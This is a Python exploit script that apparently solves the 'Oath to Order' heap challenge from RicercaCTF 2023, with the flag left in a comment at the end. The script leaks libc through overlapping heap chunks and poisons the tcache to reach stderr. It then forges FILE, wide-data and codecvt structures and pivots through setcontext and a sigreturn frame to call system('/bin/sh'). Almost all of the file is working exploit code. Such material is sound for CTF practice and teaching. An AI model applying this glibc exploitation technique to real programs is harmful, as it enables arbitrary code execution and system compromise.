#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'oath-to-order.2023.ricercactf.com', 'port':9003})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdin       = libc.symbols['_IO_2_1_stdin_']
offset_libc_mainarena   = offset_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    oto = OathToOrder(conn)

    oto.create(0, 0, 0x100, b'a'*0x10+p64(0xf0)+p64(0x40)[:-1])
    oto.create(1, 0, 1, b'b'*0x18+p64(0xf1)[:-1])
    oto.create(2, 0xd0-8, 1, b'c')

    addr_libc_mainarena = u(oto.view(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stderr        = libc.symbols['_IO_2_1_stderr_']
    addr_libc_wfile_jumps   = libc.symbols['_IO_wfile_jumps']
    addr_libc_bss           = libc.sep_section['.bss']
    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search(b'/bin/sh'))

    fake_tcache  = p16(1)
    fake_tcache += p16(1)
    fake_tcache  = fake_tcache.ljust(0x80, b'\x00')
    fake_tcache += p64(addr_libc_stderr+0x90)
    fake_tcache += p64(0xdeadbeef)
    oto.create(3, 0, 1, b'\x00'*0x58+p64(0x291)+fake_tcache)

    fake_file  = p64(0)
    fake_file += p64(addr_libc_stderr+0xe0+0x8)     # _codecvt
    fake_file += p64(addr_libc_stderr+0xe0-0x20)    # _wide_data
    fake_file += b'\x00'*0x18
    fake_file += p32(1)
    fake_file += b'\x00'*0x14
    fake_file += p64(addr_libc_wfile_jumps-8)

    fake_wide_data  = p64(addr_libc_bss+0x110)           # r/w
 
    fake_codecvt  = b'\x00'*0x28
    fake_codecvt += p64(libc.sep_function['setcontext'])
    fake_codecvt += b'\x00'*0x8
    fake_codecvt += p64(addr_libc_stderr+0xe0+0x8)
 
    frame = SigreturnFrame()
    frame.rdi = addr_libc_str_sh
    frame.rsp = addr_libc_bss+0xf08
    frame.rip = addr_libc_system
 
    ucontext      = fake_codecvt.ljust(0x40, b'\x00')+bytes(frame)[0x40:0xe0]
    ucontext     += p64(addr_libc_bss+0x120) # r/w

    oto.create(4, 0, 1, fake_file + fake_wide_data + ucontext)

    conn.sendlineafter(b'> ', b'3')
    # _IO_new_file_finish

class OathToOrder:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, idx, size, align, data):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'size: ', str(size).encode())
        self.sendlineafter(b'alignment: ', str(align).encode())
        self.sendlineafter(b'note: ', data)

    def view(self, idx):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        return self.recvuntil(b'\n1. Create', drop=True)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag-218f5d979bd7e7751e2d772cc953aa4f.txt
    # RicSec{th3_0rd3r_d0es_n0t_m3an_th3_4bs3n53_0f_fr33d0m}

if __name__=='__main__':
    main()

#==========
